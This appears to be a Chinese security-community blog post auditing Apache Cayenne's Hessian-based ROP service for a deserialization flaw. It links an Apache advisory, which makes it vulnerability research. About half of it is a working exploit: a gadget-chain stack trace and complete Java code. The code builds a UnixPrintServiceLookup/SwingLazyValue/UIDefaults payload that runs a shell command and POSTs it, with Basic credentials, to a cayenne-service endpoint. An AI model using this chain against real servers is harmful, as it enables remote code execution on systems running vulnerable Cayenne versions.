

# apache-cayenne代码审计 - 先知社区

apache-cayenne代码审计

- - -

### 0x01 起因

​ 去年年底学了学hessian协议，Umbrella师傅推荐了几套代码，其中就选择sofa-rpc、dobbo-admin、cayenne等代码。其中过年前，审计了sofa-rpc，奈何大佬已经交过cve，成了1。（估计参考：[http://xz.aliyun.com/t/13462](http://xz.aliyun.com/t/13462) ）现在年后，天天在帮客户挖cnvd，囤了点库存，所以捡起来继续审计cayenne。

​ Apache Cayenne是一个开源的Java持久化框架，用于简化与关系型数据库的交互。它提供了对象关系映射（ORM）功能，将数据库表映射为Java对象，使开发人员可以使用面向对象的方式进行数据库操作。Cayenne支持各种主流数据库，并提供了强大的查询引擎和可视化工具，帮助开发人员更轻松地管理数据模型和构建查询。它具有简单易用、灵活可扩展的特点，适用于构建数据驱动的应用程序。

### 0x02 审计

​ 直接开审

```plain
org.apache.cayenne.rop.HessianROPSerializationService#HessianROPSerializationService(com.caucho.hessian.io.SerializerFactory)
```

[![](assets/1709530899-32e41597cc8c756ef5d4102ef57fbe4f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150145-90bd49ac-d799-1.png)

​ 可以看到就是调用了hessian进行序列化。

[![](assets/1709530899-bfd90dc737f38af75da7dae63fa3238c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301145905-3155d9a2-d799-1.png)

用的也是原版hessian，那么只需要找传入点就可以了。

```plain
org.apache.cayenne.rop.ROPServlet#doPost()
```

[![](assets/1709530899-d827b0668b15309eebe89d6b07a0dc50.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301145953-4dea5f02-d799-1.png)

这里也是非常标准的直接从req获取流。

所以，马上就启动了server，直接用项目自带列子。

[![](assets/1709530899-5d2cea8879c9d47c78bf5b7f04700fea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150000-525c81b4-d799-1.png)

[![](assets/1709530899-0e971df421e38dff1bfd29959c814b8e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150007-5645847e-d799-1.png)

非常短的一条链子。

当然，结果也是轻松翻车。

[![](assets/1709530899-4f1d2c5d28e61528d0fb63a37d076888.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150014-5a6ab6fa-d799-1.png)

但是看调用是成功走到了的。

说实话，这里是坑了我很久，觉得没有问题，直接调用类的函数也能rce。最后发现，我下载的最新版4.2，这个点已经被交cve了，很早就修复了，漏洞版本设计到4.1以前。

[![](assets/1709530899-f49974e2c88412e4e01d82570992513e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150020-5e1ca1d2-d799-1.png)

显示直接开启的白名单，直接属于焊死了。所以，以后还得继续看历史漏洞，别浪费精力水cve。

```plain
org.apache.cayenne.remote.hessian.HessianConfig#createFactory(java.lang.String[], org.apache.cayenne.map.EntityResolver, java.util.Collection<java.lang.String>)
```

[![](assets/1709530899-0006ba7b43e57a337dd0fbeb7990379c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150029-6345e524-d799-1.png)

这里可以看见，默认只允许**org.apache.cayenne.\***

然后根据传的白名单添加白名单。

往上跟

```plain
org.apache.cayenne.rop.ServerHessianSerializationServiceProvider
```

[![](assets/1709530899-17205d2f86bbbf971764b3c8e0183d8d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150038-68cf2208-d799-1.png)

这里看到，启动server是默认初始化白明单就是null。也就是没得玩了。

[![](assets/1709530899-ded37118e1ef8c5ab7b771ea14cc98ae.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150042-6b0badde-d799-1.png)

修改，不要检查白名单，重打包。

[![](assets/1709530899-ed2ce32d1b7f3bb774d9f30455221906.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301150046-6dddbe4e-d799-1.png)

再次运行，成功rce。也就是影响4.1及以前版本。

### 0x03 exp

一个不会用Jodi的exp

```plain
getDefaultPrinterNameBSD:752, UnixPrintServiceLookup (sun.print)
getDefaultPrintService:663, UnixPrintServiceLookup (sun.print)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invoke:71, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invoke:71, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
equals:813, Hashtable (java.util)
putVal:634, HashMap (java.util)
put:611, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:577, SerializerFactory (com.caucho.hessian.io)
readObject:1160, HessianInput (com.caucho.hessian.io)
deserialize:74, HessianROPSerializationService (org.apache.cayenne.rop)
main:90, exp (org.apache.cayenne.tutorial.persistent)
```

```plain
package org.apache.cayenne.tutorial.persistent;

import com.caucho.hessian.io.*;
import com.sun.org.apache.xml.internal.utils.FastStringBuffer;
import org.apache.cayenne.remote.ClientMessage;
import org.apache.cayenne.rop.HessianROPSerializationService;
import sun.misc.Unsafe;
import sun.print.UnixPrintServiceLookup;
import sun.reflect.ReflectionFactory;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.*;
import java.lang.reflect.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.TreeMap;
import java.util.TreeSet;

public class exp {
     static SerializerFactory serializerFactory = new SerializerFactory();
    public static void main(String[] args) throws Exception{
        serializerFactory.setAllowNonSerializable(true);
        UnixPrintServiceLookup lookup = new UnixPrintServiceLookup();
        String cmd = "open -a calculator";
        setFieldValue(lookup, "osname", "xx");
        setFieldValue(lookup,"lpcFirstCom",new String[]{cmd,cmd,cmd});
        setFieldValue(lookup, "cmdIndex", 0);
        Method getPrintServices = lookup.getClass().getMethod("getDefaultPrintService");
        Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Object[] ags = new Object[]{invoke, new Object(), new Object[]{ getPrintServices,lookup,null}};
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil","invoke",ags);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();


        u2.put("2",swingLazyValue);
        u1.put("2",swingLazyValue);
        HashMap hashMap = maskmap(u1, u2);


        HessianROPSerializationService serializationService = new HessianROPSerializationService(serializerFactory);
        byte[] serialize = serializationService.serialize(hashMap);
        post(serialize);
//        serializationService.deserialize(serialize, ClientMessage.class);

    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }


    public static HashMap maskmap(Object u1,Object u2) throws Exception{
        HashMap hashMap = new HashMap();
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, u1, null, null);
        Object node2 = constructor.newInstance(0, u2, null, null);
        Field key = node.getDeclaredField("key");
        key.setAccessible(true);
        key.set(node1, u1);
        key.set(node2, u2);
        Field size = HashMap.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(hashMap, 2);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        table.set(hashMap, arr);

        return hashMap;
    }
    public static void post(byte[] b) throws Exception{
//        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8088));
        URL url=new URL("http://127.0.0.1:8080/cayenne-service");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestProperty("Content-Type", "application/hessian");
        con.setRequestProperty("Authorization", "Basic Y2F5ZW5uZS11c2VyOnNlY3JldA==");
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.setDoInput(true);
        try(OutputStream os = con.getOutputStream()) {
            os.write(b);
        }
        BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String line;
        StringBuilder response = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();

        // 打印响应内容
        System.out.println("Response Body: " + response.toString());


    }
}
```

### 链接

[https://lists.apache.org/thread/zthjy83t3o66x7xcbygn2vg3yjvlc9vc](https://lists.apache.org/thread/zthjy83t3o66x7xcbygn2vg3yjvlc9vc)
